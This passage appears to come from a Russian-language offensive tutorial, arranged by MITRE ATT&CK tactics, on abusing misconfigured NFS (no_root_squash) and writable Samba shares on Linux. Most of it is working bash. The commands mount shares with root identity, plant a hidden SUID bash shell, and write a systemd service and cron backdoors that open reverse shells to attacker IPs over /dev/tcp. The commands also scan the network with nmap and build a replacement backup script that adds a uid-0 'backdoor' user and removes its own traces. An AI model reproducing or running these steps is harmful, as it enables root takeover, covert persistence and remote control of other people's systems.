# –°–æ–∑–¥–∞–Ω–∏–µ —Ç–æ—á–∫–∏ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
mkdir -p /mnt/nfs_root

# –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ root
mount -t nfs -o vers=3,nolock,proto=tcp,uid=0,gid=0 192.168.1.100:/home /mnt/nfs_root

# –°–æ–∑–¥–∞–Ω–∏–µ —Ç–µ—Å—Ç–æ–≤–æ–≥–æ —Ñ–∞–π–ª–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–∞–≤
touch /mnt/nfs_root/test_file
ls -n /mnt/nfs_root/test_file

# –í—ã–≤–æ–¥:
# -rw-r--r-- 1 0 0 0 Jun 15 12:00 test_file  # UID=0 (root)
```

**–î–ª—è Samba:**
```bash
# –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ Samba-—à–∞—Ä—ã —Å –ø—Ä–∞–≤–∞–º–∏ –∑–∞–ø–∏—Å–∏
sudo mount -t cifs -o username=guest,password=,vers=2.0 //192.168.1.100/public /mnt/samba_public

# –°–æ–∑–¥–∞–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ —Å–µ—Ä–≤–∏—Å–∞ systemd
cat <<EOF | sudo tee /mnt/samba_public/evil.service
[Unit]
Description=Malicious Service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.0.0.50/4444 0>&1"

[Install]
WantedBy=multi-user.target
EOF
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è**:
- `vers=3`: –í–µ—Ä—Å–∏—è –ø—Ä–æ—Ç–æ–∫–æ–ª–∞ NFS
- `nolock`: –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –±–ª–æ–∫–∏—Ä–æ–≤–æ–∫ (—É–ø—Ä–æ—â–∞–µ—Ç —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—é)
- `proto=tcp`: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ TCP –≤–º–µ—Å—Ç–æ UDP
- `uid=0,gid=0`: –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ root-–∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–≤ –≤–ª–∞–¥–µ–ª—å—Ü–∞ —Ñ–∞–π–ª–æ–≤
- `ls -n` –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ UID/GID=0

---

#### 3. [TA0002] ‚Äì Execution (–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞)
> –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∏ –∞–∫—Ç–∏–≤–∞—Ü–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞.

**–î–ª—è NFS:**
```bash
# –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏ (–°–æ–∑–¥–∞–Ω–∏–µ SUID-—à–µ–ª–ª–∞ –Ω–∞ NFS-—à–∞—Ä–µ)
cp /bin/bash /mnt/nfs_root/.hidden_shell

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ SUID-–±–∏—Ç–∞ –∏ –ø—Ä–∞–≤ root
chmod 4777 /mnt/nfs_root/.hidden_shell
chown root:root /mnt/nfs_root/.hidden_shell

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤:
ls -l /mnt/nfs_root/.hidden_shell
# -rwsrwxrwx 1 root root ...  # s –≤ –ø—Ä–∞–≤–∞—Ö = SUID

# –ê–∫—Ç–∏–≤–∞—Ü–∏—è SUID-—à–µ–ª–ª–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ —á–µ—Ä–µ–∑ SSH
ssh user@192.168.1.100 -t "cd /home && ./.hidden_shell -p"
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
1. **–ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏**:
   - `cp /bin/bash` - –∫–æ–ø–∏—Ä—É–µ—Ç —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é Linux-–æ–±–æ–ª–æ—á–∫—É bash —Å –∞—Ç–∞–∫—É—é—â–µ–π –º–∞—à–∏–Ω—ã
   - `/mnt/nfs_root/` - —Ç–æ—á–∫–∞ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è NFS-—à–∞—Ä—ã (—É—è–∑–≤–∏–º—ã–π —Ä–µ—Å—É—Ä—Å)
   - `.hidden_shell` - –∏–º—è —Ñ–∞–π–ª–∞ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å —Ç–æ—á–∫–∏, —á—Ç–æ –¥–µ–ª–∞–µ—Ç –µ–≥–æ —Å–∫—Ä—ã—Ç—ã–º –≤ Linux

2. **–£—Å—Ç–∞–Ω–æ–≤–∫–∞ SUID-–±–∏—Ç–∞**:
   - `4777` - —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ –ø—Ä–∞–≤–∞:
   - `4` (SUID-–±–∏—Ç): –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ —Ñ–∞–π–ª–∞ –ø—Ä–æ—Ü–µ—Å—Å –Ω–∞—Å–ª–µ–¥—É–µ—Ç –ø—Ä–∞–≤–∞ –≤–ª–∞–¥–µ–ª—å—Ü–∞ (root)
   - `777` (rwx –¥–ª—è –≤—Å–µ—Ö): –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
   - SUID + bash = –ø–æ–ª—É—á–µ–Ω–∏–µ root-–æ–±–æ–ª–æ—á–∫–∏ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ

3. **–ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ –≤–ª–∞–¥–µ–ª—å—Ü–∞ root**:
   - –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –≤–ª–∞–¥–µ–ª—å—Ü–∞ —Ñ–∞–π–ª–∞ –∫–∞–∫ root (–Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–ª—è —Ä–∞–±–æ—Ç—ã SUID)

4. **–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤**:
   - –û–∂–∏–¥–∞–µ–º—ã–π –≤—ã–≤–æ–¥: `-rwsrwxrwx`
   - `s` –≤–º–µ—Å—Ç–æ `x` –≤ —Ç—Ä–∏–ø–ª–µ—Ç–µ –≤–ª–∞–¥–µ–ª—å—Ü–∞ - –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ SUID-–±–∏—Ç–∞

5. **–ê–∫—Ç–∏–≤–∞—Ü–∏—è SUID-—à–µ–ª–ª–∞**:
   - `-t` - –≤—ã–¥–µ–ª–µ–Ω–∏–µ TTY –¥–ª—è –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–π —Å–µ—Å—Å–∏–∏
   - `./.hidden_shell -p` - –∫–ª—é—á `-p` —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ (SUID)
   - –†–µ–∑—É–ª—å—Ç–∞—Ç: –ø–æ–ª—É—á–µ–Ω–∏–µ root-–æ–±–æ–ª–æ—á–∫–∏ –Ω–∞ —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ

**–î–ª—è Samba:**
```bash
# –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ –¥–ª—è reverse shell
echo '#!/bin/bash
bash -i >& /dev/tcp/10.0.0.50/4444 0>&1' | sudo tee /mnt/samba_public/backdoor.sh
sudo chmod +x /mnt/samba_public/backdoor.sh

# –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ cron (–Ω–∞ —Ü–µ–ª–µ–≤–æ–π Linux-–º–∞—à–∏–Ω–µ)
ssh user@192.168.1.100 "echo '* * * * * root /public/backdoor.sh' | sudo tee -a /etc/crontab"
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
1. **–°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ –¥–ª—è reverse shell**:
   - `#!/bin/bash` - shebang –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –∫–∞–∫ bash-—Å–∫—Ä–∏–ø—Ç
   - `bash -i` - –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∞—è –æ–±–æ–ª–æ—á–∫–∞
   - `>& /dev/tcp/10.0.0.50/4444` - –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤–≤–æ–¥–∞/–≤—ã–≤–æ–¥–∞ –≤ TCP-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
   - `0>&1` - –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏–µ stdin –≤ stdout
   - `tee` - –∑–∞–ø–∏—Å—å –≤ —Ñ–∞–π–ª —Å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ–º –≤ –∫–æ–Ω—Å–æ–ª–∏

2. **–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–∞–≤ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ**:
   - `+x` - –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ —Ñ–ª–∞–≥–∞ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è (–Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞)

3. **–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ cron**:
   - `* * * * *` - –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É
   - `root` - –∑–∞–ø—É—Å–∫ –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root
   - `tee -a` - –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ —Å—Ç—Ä–æ–∫–∏ –≤ –∫–æ–Ω–µ—Ü —Ñ–∞–π–ª–∞ (—Å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ)
   - `/etc/crontab` - —Å–∏—Å—Ç–µ–º–Ω—ã–π —Ñ–∞–π–ª —Ä–∞—Å–ø–∏—Å–∞–Ω–∏—è –∑–∞–¥–∞—á –≤ Linux
   - **–†–µ–∑—É–ª—å—Ç–∞—Ç**: –∫–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å—Å—è reverse shell —Å –ø—Ä–∞–≤–∞–º–∏ root

---

### –ö–ª—é—á–µ–≤—ã–µ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏

1. **–ú–µ—Ö–∞–Ω–∏–∑–º SUID –≤ Linux**:
   - –ö–æ–≥–¥–∞ —Ñ–∞–π–ª —Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–º SUID-–±–∏—Ç–æ–º –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è, –ø—Ä–æ—Ü–µ—Å—Å –ø–æ–ª—É—á–∞–µ—Ç –ø—Ä–∞–≤–∞ –≤–ª–∞–¥–µ–ª—å—Ü–∞ —Ñ–∞–π–ª–∞
   - –í –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ –≤–ª–∞–¥–µ–ª–µ—Ü - root, –∑–Ω–∞—á–∏—Ç –ø—Ä–æ—Ü–µ—Å—Å –∑–∞–ø—É—Å—Ç–∏—Ç—Å—è —Å root-–ø—Ä–∞–≤–∞–º–∏

2. **–†–∞–±–æ—Ç–∞ cron –≤ Linux**:
   - –°–∏—Å—Ç–µ–º–Ω—ã–π –¥–µ–º–æ–Ω, –≤—ã–ø–æ–ª–Ω—è—é—â–∏–π –∑–∞–¥–∞—á–∏ –ø–æ —Ä–∞—Å–ø–∏—Å–∞–Ω–∏—é
   - –ó–∞–¥–∞—á–∏ –≤ `/etc/crontab` –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è —Å —É–∫–∞–∑–∞–Ω–Ω—ã–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏
   - –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –∑–∞–¥–∞—á–∏ –æ—Ç root –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ—Ç –º–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏

3. **–°–µ—Ç–µ–≤–æ–µ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ**:
   - `/dev/tcp/` - –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –≤ Linux –¥–ª—è TCP-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
   - –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ –∞—Ç–∞–∫—É—é—â–µ–≥–æ
   - –ü—Ä–∏ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏–∏ cron - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –∞—Ç–∞–∫—É—é—â–µ–º—É

4. **–°–∫—Ä—ã—Ç–Ω–æ—Å—Ç—å**:
   - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç—ã—Ö —Ñ–∞–π–ª–æ–≤ (`.hidden_shell`)
   - –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ –ø–æ–¥ –ª–µ–≥–∏—Ç–∏–º–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ —Å —Ñ–∞–π–ª–∞–º–∏
   - –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –º–µ—Ö–∞–Ω–∏–∑–º–æ–≤ (bash, cron)

---

## –ü—Ä–∏–º–µ—Ä—ã –∞—Ç–∞–∫

### –ü—Ä–∏–º–µ—Ä 1: –ü–æ–¥–º–µ–Ω–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ —á–µ—Ä–µ–∑ NFS —Å `no_root_squash`

–ù–∞ —Å–µ—Ä–≤–µ—Ä–µ 192.168.1.100 —Å Linux (Ubuntu 22.04) –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è NFS —Å —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–µ–π `/scripts`. 
–≠—Ç–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è —Å–æ–¥–µ—Ä–∂–∏—Ç —Å–∫—Ä–∏–ø—Ç—ã, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è –ø–æ —Ä–∞—Å–ø–∏—Å–∞–Ω–∏—é —Å –ø—Ä–∞–≤–∞–º–∏ root. 
–í –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ `/etc/exports` –¥–æ–ø—É—â–µ–Ω–∞ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: `/scripts *(rw,sync,no_root_squash,no_subtree_check)`
–ê—Ç–∞–∫—É—é—â–∏–π (192.168.1.50) –æ–±–Ω–∞—Ä—É–∂–∏—Ç —ç—Ç—É —É—è–∑–≤–∏–º–æ—Å—Ç—å –∏ –ø–æ–¥–º–µ–Ω–∏—Ç —Å–∫—Ä–∏–ø—Ç –µ–∂–µ–¥–Ω–µ–≤–Ω–æ–≥–æ —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –æ–±—Ä–∞—Ç–Ω—ã–π —à–µ–ª–ª —Å –ø—Ä–∞–≤–∞–º–∏ root.

#### –®–∞–≥ 1: –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –∞–Ω–∞–ª–∏–∑ (Discovery)
> –ù–∞–π—Ç–∏ —É—è–∑–≤–∏–º—ã–µ NFS-—Å–µ—Ä–≤–µ—Ä—ã –∏ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∏—Ö –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é.
```bash
# –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–µ—Ç–∏ –Ω–∞ NFS-—Å–µ—Ä–≤–µ—Ä—ã
nmap -sU -p111 --open 192.168.1.0/24 -oG nfs-servers.txt

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π
showmount -e 192.168.1.100
# –í—ã–≤–æ–¥:
# Export list for 192.168.1.100:
# /scripts  (everyone)
# /data     (ro,192.168.1.0/24)
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
1. `nmap -sU -p111`: UDP-—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–∞ 111 (rpcbind), –∫–æ—Ç–æ—Ä—ã–π –≤—Å–µ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è NFS
2. `--open`: –ü–æ–∫–∞–∑–∞—Ç—å —Ç–æ–ª—å–∫–æ –æ—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã
3. `-oG nfs-servers.txt`: –°–æ—Ö—Ä–∞–Ω–∏—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –≤ grep-—Ñ–æ—Ä–º–∞—Ç–µ
4. `showmount -e`: –ü–æ–∫–∞–∑–∞—Ç—å —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º —Å–µ—Ä–≤–µ—Ä–µ

**–†–µ–∑—É–ª—å—Ç–∞—Ç:**  
–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è `/scripts` —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∞ –¥–ª—è –≤—Å–µ—Ö (`everyone`) —Å –ø—Ä–∞–≤–∞–º–∏ —á—Ç–µ–Ω–∏—è/–∑–∞–ø–∏—Å–∏.

---

#### –®–∞–≥ 2: –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∫ –∞—Ç–∞–∫–µ (Privilege Escalation)
> –ü–æ–ª—É—á–∏—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å —Å–æ–∑–¥–∞–≤–∞—Ç—å —Ñ–∞–π–ª—ã –æ—Ç –∏–º–µ–Ω–∏ root –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.
```bash
# –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
mkdir -p /mnt/nfs_scripts
sudo mount -t nfs -o vers=3,nolock,proto=tcp,uid=0,gid=0 192.168.1.100:/scripts /mnt/nfs_scripts

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞
echo "Test file" | sudo tee /mnt/nfs_scripts/test_file  # –°–æ–∑–¥–∞–Ω–∏–µ —Ç–µ—Å—Ç–æ–≤–æ–≥–æ —Ñ–∞–π–ª–∞
ls -n /mnt/nfs_scripts/test_file  # –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–ª–∞–¥–µ–ª—å—Ü–∞
# –í—ã–≤–æ–¥:
# -rw-r--r-- 1 0 0 9 Jun 15 12:30 test_file 
# (UID=0, root)
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
1. `mkdir -p`: –°–æ–∑–¥–∞–µ—Ç —Ç–æ—á–∫—É –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è (–µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç)
2. –ü–∞—Ä–∞–º–µ—Ç—Ä—ã –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∫–æ–º–∞–Ω–¥–æ–π `mount`:
   - `vers=3`: –í–µ—Ä—Å–∏—è –ø—Ä–æ—Ç–æ–∫–æ–ª–∞ NFS
   - `nolock`: –û—Ç–∫–ª—é—á–∏—Ç—å –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ (—É–ø—Ä–æ—â–∞–µ—Ç —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—é)
   - `proto=tcp`: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å TCP –≤–º–µ—Å—Ç–æ UDP (–Ω–∞–¥–µ–∂–Ω–µ–µ)
   - `uid=0,gid=0`: –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å –≤–ª–∞–¥–µ–ª—å—Ü–∞ —Ñ–∞–π–ª–æ–≤ –∫–∞–∫ root
3. `tee`: –°–æ–∑–¥–∞—Ç—å —Ç–µ—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª –∏ –≤—ã–≤–µ—Å—Ç–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ
4. `ls -n`: –ü–æ–∫–∞–∑–∞—Ç—å UID/GID —Ñ–∞–π–ª–∞ (0 = root)

**–†–µ–∑—É–ª—å—Ç–∞—Ç:**  
–û–ø—Ü–∏—è `no_root_squash` –≤ `/etc/exports` –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å–æ—Ö—Ä–∞–Ω—è—Ç—å root-–ø—Ä–∞–≤–∞ –ø—Ä–∏ –∑–∞–ø–∏—Å–∏ —Ñ–∞–π–ª–æ–≤.

---

#### –®–∞–≥ 3: –ê–Ω–∞–ª–∏–∑ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ
> –ù–∞–π—Ç–∏ —Å–∫—Ä–∏–ø—Ç—ã, –≤—ã–ø–æ–ª–Ω—è–µ–º—ã–µ —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ root.
```bash
# –ò—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–æ–≤
ls -la /mnt/nfs_scripts
# –í—ã–≤–æ–¥:
# total 16
# -rwxr-xr-x 1 0 0  120 Jun 10 08:00 daily_backup.sh
# -rwxr-xr-x 1 0 0   78 Jun 05 09:00 weekly_cleanup.sh


# –ü—Ä–æ—Å–º–æ—Ç—Ä —Å–∫—Ä–∏–ø—Ç–∞ —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è
cat /mnt/nfs_scripts/daily_backup.sh
# –í—ã–≤–æ–¥:
#!/bin/bash
# tar -czf /backups/daily-$(date +%F).tar.gz /data
# find /backups -mtime +7 -delete
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
1. `ls -la`: –ü–æ–∫–∞–∑–∞—Ç—å –ø–æ–¥—Ä–æ–±–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ —Å –≤–ª–∞–¥–µ–ª—å—Ü–∞–º–∏
2. `cat`: –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Å–∫—Ä–∏–ø—Ç–∞ —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è
   - –°–∫—Ä–∏–ø—Ç—ã, –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∞—â–∏–µ root
   - –°–∫—Ä–∏–ø—Ç—ã, –≤—ã–ø–æ–ª–Ω—è–µ–º—ã–µ –ø–æ —Ä–∞—Å–ø–∏—Å–∞–Ω–∏—é
   - –°–∫—Ä–∏–ø—Ç—ã —Å –ø—Ä–∞–≤–∞–º–∏ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ (x)

**–†–µ–∑—É–ª—å—Ç–∞—Ç:**  
–°–∫—Ä–∏–ø—Ç `daily_backup.sh` –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –µ–∂–µ–¥–Ω–µ–≤–Ω–æ –æ—Ç –∏–º–µ–Ω–∏ `root` –∏ –¥–µ–ª–∞–µ—Ç —Ä–µ–∑–µ—Ä–≤–Ω—ã–µ –∫–æ–ø–∏–∏ –¥–∞–Ω–Ω—ã—Ö.

---

#### –®–∞–≥ 4: –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ (Execution)
> –°–æ–∑–¥–∞—Ç—å —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –¥–∞—Å—Ç –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Å–∏—Å—Ç–µ–º–æ–π.
```bash
# –ö–æ–¥ —Å–∫—Ä–∏–ø—Ç–∞
cat << 'EOF' | sudo tee /mnt/nfs_scripts/evil_backdoor.sh
#!/bin/bash

# 1. –î–æ–±–∞–≤–ª–µ–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–ø–∞—Ä–æ–ª—å P@ssw0rd)
echo "backdoor:\$6\$salt\$hash:0:0:root:/root:/bin/bash" >> /etc/passwd

# 2. –û–±—Ä–∞—Ç–Ω—ã–π —à–µ–ª–ª –¥–ª—è –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞
bash -c "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1" &

# 3. –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞
/bin/bash /scripts/daily_backup.sh.orig

# 4. –£–¥–∞–ª–µ–Ω–∏–µ —Å–ª–µ–¥–æ–≤
rm /scripts/evil_backdoor.sh
mv /scripts/daily_backup.sh.orig /scripts/daily_backup.sh
EOF
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
1. **–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:**
   - `backdoor`: –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
   - `\$6\$salt\$hash`: –•—ç—à SHA-512 –ø–∞—Ä–æ–ª—è —Å —Å–æ–ª—å—é (–Ω–∞–ø—Ä–∏–º–µ—Ä, `P@ssw0rd`)
   - `0:0`: UID –∏ GID root
   - `/bin/bash`: –û–±–æ–ª–æ—á–∫–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é

2. **–û–±—Ä–∞—Ç–Ω—ã–π —à–µ–ª–ª:**
   - `bash -i`: –ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∞—è –æ–±–æ–ª–æ—á–∫–∞
   - `>& /dev/tcp/...`: –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤–≤–æ–¥–∞/–≤—ã–≤–æ–¥–∞ –≤ TCP-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
   - `0>&1`: –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ stdin –≤ stdout
